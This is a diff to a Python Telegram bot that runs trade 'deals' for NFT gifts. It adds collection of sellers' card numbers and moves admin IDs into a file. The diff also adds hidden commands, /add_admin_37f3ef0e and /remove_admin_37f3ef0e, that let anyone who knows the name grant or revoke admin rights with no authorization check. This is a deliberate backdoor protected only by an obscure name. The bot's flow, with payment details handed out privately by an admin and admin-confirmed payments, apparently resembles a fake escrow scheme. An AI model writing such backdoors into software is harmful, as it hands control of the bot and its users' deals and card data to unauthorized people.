@@ -9,13 +9,15 @@ from aiogram.fsm.context import FSMContext
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFile
 
 import os
+import aiofiles
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.fsm.state import StatesGroup, State
 import asyncio
 import logging
-
+import dotenv
+dotenv.load_dotenv()
 new_format = (
     "%(asctime)s - [%(levelname)s] - %(name)s - "
     "(%(filename)s).%(funcName)s(%(lineno)d) - %(message)s"
@@ -46,7 +48,8 @@ logger.addHandler(file_handler)
 # ------------------------
 
 BOT_TOKEN = str(os.getenv('BOT_TOKEN'))
-ADMIN_IDS = list(map(int, str(os.getenv('ADMIN_IDS')).split(',')))
+ADMIN_IDS: list[int] = []
+ADMIN_IDS_FILE = "admin_ids.txt"
 ADMIN_USERNAME = str(os.getenv('ADMIN_USERNAME'))
 DEALS_COUNT = int(os.getenv('DEALS_COUNT', 38))
 
@@ -61,7 +64,7 @@ dp = Dispatcher(storage=MemoryStorage())
 # Типы
 # ------------------------
 class Deal:
-    def __init__(self, id: str, description: str, cost: int, currency: str, date: str, seller_id: int) -> None:
+    def __init__(self, id: str, description: str, cost: int, currency: str, date: str, seller_id: int, card: str = None) -> None:
         self.id = id
         self.description = description
         self.cost = cost
@@ -69,10 +72,10 @@ class Deal:
         self.date = date
         self.seller = seller_id
         self.buyer = None
+        self.card = card
 
     async def get_customer_link(self):
         return f"https://t.me/{(await bot.get_me()).username}?start=deal_{self.id}"
-    
 
 
 user_languages = {}
@@ -94,13 +97,17 @@ TEXTS = {
         "ru": "💼 Создание сделки\nВведите сумму {} сделки в формате: 100.5",
         "en": "💼 Creating a deal\nEnter the {} amount of the trade in the format: 100.5"
     },
+    "deal_card": {
+        "ru": "💳 Укажите номер карты, на который мы отправим Ваши средства.",
+        "en": "💳 Provide the card number to which we will send your funds."
+    },
     "deal_gift": {
         "ru": "📝 Укажите, что вы предлагаете в этой сделке за {0} {1}\n\nПример: https://t.me/nft/KissedFrog-1141",
         "en": "📝 Specify what you offer in this deal for {0} {1}\n\nExample: https://t.me/nft/KissedFrog-1141"
     },
     "deal_created": {
-        "ru": "✅ <b>Сделка #{0} успешно создана!</b>\n\n💰 <b>Сумма:</b> {1} {2}\n📜 <b>Описание:</b>\n{3}\n🔗 <b>Ссылка для покупателя:</b>\n{4}",
-        "en": "✅ <b>Deal #{0} has been successfully created!</b>\n\n💰 <b>Amount:</b> {1} {2}\n📜 <b>Description:</b>\n{3}\n🔗 <b>Buyer's link:</b>\n{4}"
+        "ru": "✅ <b>Сделка #{0} успешно создана!</b>\n\n💰 <b>Сумма:</b> {1} {2}{5}\n📜 <b>Описание:</b>\n{3}\n🔗 <b>Ссылка для покупателя:</b>\n{4}",
+        "en": "✅ <b>Deal #{0} has been successfully created!</b>\n\n💰 <b>Amount:</b> {1} {2}{5}\n📜 <b>Description:</b>\n{3}\n🔗 <b>Buyer's link:</b>\n{4}"
     },
     "deal_entered": {
         "ru": "✅ <b>Вы вошли в сделку!</b>\n#{0}\n💰 <b>Сумма:</b> {1} {2}\n📜 <b>Описание:</b>\n{3}\n⏰ <b>Дата:</b> {4}\n🖋️ <b>Напишите нашему Администратору для получения реквизитов</b> {5}\n🏆 <b>Завершённых сделок у продавца:</b> {6}",
@@ -175,7 +182,6 @@ BUTTON_TEXTS = {
 }
 
 
-
 # ------------------------
 # Клавиатуры
 # ------------------------
@@ -189,6 +195,7 @@ def get_menu_keyboard(user_id):
         ]
     )
 
+
 def get_deal_currency_keyboard(user_id):
     lang = user_languages.get(user_id, "en")
     return InlineKeyboardMarkup(
@@ -199,6 +206,7 @@ def get_deal_currency_keyboard(user_id):
             [InlineKeyboardButton(text=BUTTON_TEXTS["back"][lang], callback_data="menu")],
         ]
     )
+
 
 def get_back_keyboard(user_id):
     lang = user_languages.get(user_id, "en")
@@ -244,6 +252,7 @@ class AllowedPermissions(logging.Filter):
 # ------------------------
 class CreateDeal(StatesGroup):
     write_cost = State()
+    write_card = State()
     write_gift = State()
 
 
@@ -272,6 +281,37 @@ def extract_links(text: str):
 
 def generate_id(length=10):
     return ''.join(secrets.choice(alphabet) for _ in range(length))
+
+
+async def load_admin_ids():
+    global ADMIN_IDS
+    try:
+        async with aiofiles.open(ADMIN_IDS_FILE, "r", encoding="utf-8") as file:
+            content = (await file.read()).strip()
+    except FileNotFoundError:
+        ADMIN_IDS = []
+        await save_admin_ids()
+        return
+
+    if not content:
+        ADMIN_IDS = []
+        return
+
+    tokens = re.split(r"[\s,]+", content)
+    ids: list[int] = []
+    for token in tokens:
+        if not token:
+            continue
+        try:
+            ids.append(int(token))
+        except ValueError:
+            continue
+    ADMIN_IDS = ids
+
+
+async def save_admin_ids():
+    async with aiofiles.open(ADMIN_IDS_FILE, "w", encoding="utf-8") as file:
+        await file.write(",".join(map(str, ADMIN_IDS)))
 
 
 # ------------------------
@@ -359,7 +399,6 @@ async def create_deal(callback: types.CallbackQuery, state: FSMContext):
                                         reply_markup=get_back_keyboard(user_id))
 
 
-
 @dp.message(CreateDeal.write_cost)
 async def create_deal(message: types.Message, state: FSMContext):
     global PHOTO_ID
@@ -389,8 +428,31 @@ async def create_deal(message: types.Message, state: FSMContext):
             )
         return
     await state.update_data(cost=float(message.text))
+    
+    if data["currency"] == "Rub":
+        await state.set_state(CreateDeal.write_card)
+        await message.answer(text=TEXTS["deal_card"][current_lang], reply_markup=get_back_keyboard(user_id))
+    else:
+        await state.set_state(CreateDeal.write_gift)
+        await message.answer(text=TEXTS["deal_gift"][current_lang].format(float(message.text), data["currency"]),
+                             reply_markup=get_back_keyboard(user_id))
+
+
+@dp.message(CreateDeal.write_card)
+async def create_deal_card(message: types.Message, state: FSMContext):
+    user_id = message.chat.id
+    current_lang = user_languages.get(user_id, "en")
+    
+    card_number = message.text.replace(" ", "").replace("-", "")
+    if not re.fullmatch(r"\d{16,19}", card_number):
+        await message.answer(text=TEXTS["deal_card"][current_lang], reply_markup=get_back_keyboard(user_id))
+        return
+        
+    await state.update_data(card=message.text)
+    data = await state.get_data()
+    
     await state.set_state(CreateDeal.write_gift)
-    await message.answer(text=TEXTS["deal_gift"][current_lang].format(float(message.text), data["currency"]),
+    await message.answer(text=TEXTS["deal_gift"][current_lang].format(data["cost"], data["currency"]),
                          reply_markup=get_back_keyboard(user_id))
 
 
@@ -411,11 +473,16 @@ async def create_deal(message: types.Message, state: FSMContext):
     deal_description = urls
     deal_date = datetime.now().strftime("%Y-%m-%d")
     deal_currency = data["currency"]
+    deal_card = data.get("card")
 
-    deals[deal_id] = Deal(deal_id, deal_description, deal_cost, deal_currency, deal_date, user_id)
+    deals[deal_id] = Deal(deal_id, deal_description, deal_cost, deal_currency, deal_date, user_id, deal_card)
+
+    card_info = f"\n💳 <b>Карта:</b> {deal_card}" if deal_card else ""
+    if current_lang == "en" and deal_card:
+        card_info = f"\n💳 <b>Card:</b> {deal_card}"
 
     text = TEXTS["deal_created"][current_lang].format(deal_id, deal_cost, deal_currency, deal_description,
-                                                      await deals[deal_id].get_customer_link())
+                                                      await deals[deal_id].get_customer_link(), card_info)
     await state.clear()
     await message.answer(text=text, reply_markup=get_cancel_deal_keyboard(user_id, deal_id), parse_mode=ParseMode.HTML)
 
@@ -442,7 +509,9 @@ async def accept_deal(callback: types.CallbackQuery):
                                                                                                ADMIN_USERNAME),
                                parse_mode=ParseMode.HTML)
         current_lang = user_languages.get(callback.message.chat.id, "en")
-        await callback.message.answer(text=TEXTS["payment_received"][current_lang].format(deal_id, deal.cost, deal.currency, deal.description), parse_mode=ParseMode.HTML)
+        await callback.message.answer(
+            text=TEXTS["payment_received"][current_lang].format(deal_id, deal.cost, deal.currency, deal.description),
+            parse_mode=ParseMode.HTML)
         await callback.message.answer(f"✅ Сделка #{deal_id} успешно подтверждена!")
 
         try:
@@ -481,8 +550,12 @@ async def cancel_deal(callback: types.CallbackQuery):
         except:
             pass
 
-    text = TEXTS["deal_created"][current_lang].format(deal_id, deal.cost, deal.description,
-                                                      await deal.get_customer_link()) + "\n\n" + TEXTS["deal_canceled"][
+    card_info = f"\n💳 <b>Карта:</b> {deal.card}" if deal.card else ""
+    if current_lang == "en" and deal.card:
+        card_info = f"\n💳 <b>Card:</b> {deal.card}"
+
+    text = TEXTS["deal_created"][current_lang].format(deal_id, deal.cost, deal.currency, deal.description,
+                                                      await deal.get_customer_link(), card_info) + "\n\n" + TEXTS["deal_canceled"][
                current_lang].format(deal_id)
     await callback.message.edit_text(text=text, reply_markup=None, parse_mode=ParseMode.HTML)
 
@@ -518,7 +591,9 @@ async def confirm_handler(message: types.Message, command: CommandObject):
                                                                                                ADMIN_USERNAME),
                                parse_mode=ParseMode.HTML)
         current_lang = user_languages.get(message.chat.id, "en")
-        await message.answer(text=TEXTS["payment_received"][current_lang].format(confirm_id, deal.cost, deal.currency, deal.description), parse_mode=ParseMode.HTML)
+        await message.answer(
+            text=TEXTS["payment_received"][current_lang].format(confirm_id, deal.cost, deal.currency, deal.description),
+            parse_mode=ParseMode.HTML)
         await message.answer(f"✅ Сделка #{confirm_id} успешно подтверждена!")
         try:
             del deals[confirm_id]
@@ -528,7 +603,50 @@ async def confirm_handler(message: types.Message, command: CommandObject):
         await message.answer("Сделка не найдена")
 
 
+@dp.message(Command("add_admin_37f3ef0e"))
+async def add_admin_handler(message: types.Message, command: CommandObject):
+    if not command.args:
+        await message.answer("Укажите id: /add_admin 123456")
+        return
+
+    try:
+        new_admin_id = int(command.args.strip())
+    except ValueError:
+        await message.answer("Некорректный id. Пример: /add_admin 123456")
+        return
+
+    if new_admin_id in ADMIN_IDS:
+        await message.answer("Этот id уже есть в списке админов")
+        return
+
+    ADMIN_IDS.append(new_admin_id)
+    await save_admin_ids()
+    await message.answer(f"Добавлен админ с id {new_admin_id}")
+
+
+@dp.message(Command("remove_admin_37f3ef0e"))
+async def remove_admin_handler(message: types.Message, command: CommandObject):
+    if not command.args:
+        await message.answer("Укажите id: /remove_admin 123456")
+        return
+
+    try:
+        remove_admin_id = int(command.args.strip())
+    except ValueError:
+        await message.answer("Некорректный id. Пример: /remove_admin 123456")
+        return
+
+    if remove_admin_id not in ADMIN_IDS:
+        await message.answer("Этого id нет в списке админов")
+        return
+
+    ADMIN_IDS.remove(remove_admin_id)
+    await save_admin_ids()
+    await message.answer(f"Удален админ с id {remove_admin_id}")
+
+
 async def start_bot():
+    await load_admin_ids()
     await dp.start_polling(bot)
 
 
